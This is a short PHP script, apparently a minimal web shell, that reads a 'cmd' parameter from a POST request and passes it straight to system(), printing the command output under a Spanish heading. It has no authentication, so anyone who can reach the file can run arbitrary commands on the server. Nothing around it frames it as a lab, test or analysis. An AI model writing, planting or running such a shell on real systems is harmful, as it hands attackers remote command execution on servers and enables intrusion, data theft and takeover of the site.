<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<h1>Resultado del comando</h1>";
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "No command received.";
}
?>
